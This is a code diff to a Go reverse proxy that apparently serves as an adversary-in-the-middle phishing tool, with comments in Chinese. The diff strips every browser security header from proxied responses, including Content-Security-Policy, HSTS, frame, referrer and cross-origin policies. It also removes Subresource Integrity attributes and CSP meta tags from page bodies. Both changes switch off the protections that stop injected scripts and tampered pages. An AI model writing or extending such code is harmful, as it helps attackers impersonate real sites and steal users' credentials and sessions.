@@ -929,16 +929,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
+			// 删除所有安全头，包括 CSP
 			var rm_headers = []string{
 				"Content-Security-Policy",
 				"Content-Security-Policy-Report-Only",
+				"X-Content-Security-Policy",
+				"X-WebKit-CSP",
 				"Strict-Transport-Security",
 				"X-XSS-Protection",
 				"X-Content-Type-Options",
 				"X-Frame-Options",
+				"Permissions-Policy",
+				"Feature-Policy",
+				"Referrer-Policy",
+				"Cross-Origin-Opener-Policy",
+				"Cross-Origin-Embedder-Policy",
+				"Cross-Origin-Resource-Policy",
 			}
 			for _, hdr := range rm_headers {
 				resp.Header.Del(hdr)
+				// 确保删除所有同名头（某些服务器会设置多个）
+				for resp.Header.Get(hdr) != "" {
+					resp.Header.Del(hdr)
+				}
 			}
 
 			redirect_set := false
@@ -1173,13 +1186,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				//// 删除 SRI integrity 属性，防止浏览器校验失败（必须在所有处理之后）
-				//if stringExists(mime, p.auto_filter_mimes) {
-				//	re_integrity := regexp.MustCompile(`\s+integrity\s*=\s*["'][^"']*["']`)
-				//	body = []byte(re_integrity.ReplaceAllString(string(body), ""))
-				//	re_integrity2 := regexp.MustCompile(`\s+integrity\s*=\s*\S+`)
-				//	body = []byte(re_integrity2.ReplaceAllString(string(body), ""))
-				//}
+				// 删除 SRI integrity 属性，防止浏览器校验失败（必须在所有处理之后）
+				if stringExists(mime, p.auto_filter_mimes) {
+					re_integrity := regexp.MustCompile(`\s+integrity\s*=\s*["'][^"']*["']`)
+					body = []byte(re_integrity.ReplaceAllString(string(body), ""))
+					re_integrity2 := regexp.MustCompile(`\s+integrity\s*=\s*\S+`)
+					body = []byte(re_integrity2.ReplaceAllString(string(body), ""))
+					
+					// 删除 HTML 中的 CSP meta 标签
+					re_csp_meta := regexp.MustCompile(`(?i)<meta[^>]*http-equiv\s*=\s*["']?Content-Security-Policy["']?[^>]*>`)
+					body = []byte(re_csp_meta.ReplaceAllString(string(body), ""))
+				}
 
 				if stringExists(mime, []string{"text/html"}) {
 
